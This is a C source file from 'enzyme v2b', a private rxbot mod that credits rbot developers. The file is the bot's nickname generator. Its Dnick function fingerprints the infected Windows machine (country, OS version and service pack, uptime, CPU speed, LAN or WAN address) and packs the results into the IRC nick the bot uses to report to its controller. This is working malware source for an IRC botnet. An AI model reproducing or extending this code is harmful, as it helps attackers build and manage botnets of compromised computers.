/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/



#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

RNICK rnick[]={
	{"const", CONSTNICK, rndnickconst},
	{"letter", LETTERNICK, rndnickletter},
	//{"comp", COMPNICK, rndnickcomp},
	//{"country", COUNTRYNICK, rndnickcountry},
	//{"countryos", COUNTRYOSNICK, rndnickcountryos},
	{"dnick", DNICK, Dnick},
	//{"os", OSNICK, rndnickos}
    
};

char *rndnickconst(SOCKET sock, char *strbuf)
{
	srand(GetTickCount());

	_snprintf(strbuf, MAXNICKLEN, "%s", nickconst);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *rndnickletter(SOCKET sock, char *strbuf)
{
    srand(GetTickCount());

	int randlen = (rand()%3)+maxrand;

	for (int i=0; i < randlen; i++)
		strbuf[i] = (rand()%26)+97;
	strbuf[i] = '\0';

	return (strbuf);
}

/*char *rndnickcomp(SOCKET sock, char *strbuf)
{
    int i;

    LPTSTR lpszCompName="PC";
    DWORD cchBuff = 256;
	BOOL NameGood = FALSE;

    srand(GetTickCount());

	if(!GetComputerName(lpszCompName, &cchBuff))
		lpszCompName="PC";

	for (i=65;i<91;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    for (i=97;i<123;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    if (!NameGood)
		lpszCompName="PC";
    _snprintf(strbuf, MAXNICKLEN, lpszCompName);

    for (i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}*/

/*char *rndnickcountry(SOCKET sock, char *strbuf)
{
	char temp[10];

    srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	_snprintf(strbuf, MAXNICKLEN, "%s|", temp);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}*/

/*char *rndnickcountryos(SOCKET sock, char *strbuf)
{
	char temp[10];
	char *os="", *sp="";

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); 

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "23";
	else os = "UN";

	if (strcmp(verinfo.szCSDVersion, "\0") == 0) sp = "SP0";
	else if (strstr(verinfo.szCSDVersion, "1") != NULL) sp = "SP1";
	else if (strstr(verinfo.szCSDVersion, "2") != NULL) sp = "SP2";
	else if (strstr(verinfo.szCSDVersion, "3") != NULL) sp = "SP3";
	else if (strstr(verinfo.szCSDVersion, "4") != NULL) sp = "SP4";
	else sp = "UNK";

	srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));

	_snprintf(strbuf, MAXNICKLEN, "%s|%s|%s|", temp, os, sp);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}*/

char *Dnick(SOCKET sock, char *strbuf)
{
	char temp[10], ip[16], cpu[16], up[10];
	char *os="", *sp="";

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); 

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "23";
	else os = "UN";

	if (strcmp(verinfo.szCSDVersion, "\0") == 0) sp = "SP0";
	else if (strstr(verinfo.szCSDVersion, "1") != NULL) sp = "SP1";
	else if (strstr(verinfo.szCSDVersion, "2") != NULL) sp = "SP2";
	else if (strstr(verinfo.szCSDVersion, "3") != NULL) sp = "SP3";
	else if (strstr(verinfo.szCSDVersion, "4") != NULL) sp = "SP4";
	else sp = "UNK";

	if (PrivateIP(GetIP(sock))) _snprintf(ip, sizeof(ip), "L");
	else _snprintf(ip, sizeof(ip), "W");

	//get uptime
	int up1=-1, up2=-1, up3=-1;
	sscanf(Uptime(), "%dd %dh %dm", &up1, &up2, &up3);
	if (up1 < 10) _snprintf(up, sizeof(up), "0%d", up1);
	else if (up1 < 100) itoa(up1, up, 10);
	else _snprintf(up, sizeof(up), "99");

	//get cpu speed
	//%I64uMHz
	int cpua = (int)GetCPUSpeed();
	if (cpua < 1000) _snprintf(cpu, sizeof(cpu), "0%d", cpua);
	else  _snprintf(cpu, sizeof(cpu), "%d", cpua);

	srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));

	_snprintf(strbuf, MAXNICKLEN, "%s|%s|%s|%s|%s|%s|", temp, os, sp, up, cpu, ip);

    for (int i = 0; i < maxrand; i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

/*char *rndnickos(char *strbuf)
{
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else os = "???";

	_snprintf(strbuf,MAXNICKLEN,"[%s]|",os);

    for (int i=0;i < maxrand;i++)
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}*/

/*char *prefixnick(char *strbuf)
{
	char tmpbuf[MAXNICKLEN];

	unsigned int days = GetTickCount() / 86400000;
	if (days > 100)
		#ifndef NO_MIRCNICK
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]%s", days, ((fFindWindow("mIRC",0))?("[M]"):("")));
	else
		sprintf(tmpbuf, ((fFindWindow("mIRC",0))?("[M]"):("")));
		#else
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]", days);
		#endif

	if (strlen(tmpbuf) > 2) {
		strncat(tmpbuf, strbuf, sizeof(tmpbuf));
		strncpy(strbuf, tmpbuf, MAXNICKLEN);
	}

	return (strbuf);
};*/

char *rndnick(SOCKET sock, char *strbuf, int type, char *name)
{
	for (int i=0; i < (sizeof(rnick) / sizeof(RNICK)); i++)
		if ((name)?(strcmp(name,rnick[i].name)==0):(rnick[i].type == type)) {
			rnick[i].rnfunc(sock, strbuf);
			break;
		}

	return (strbuf);
}
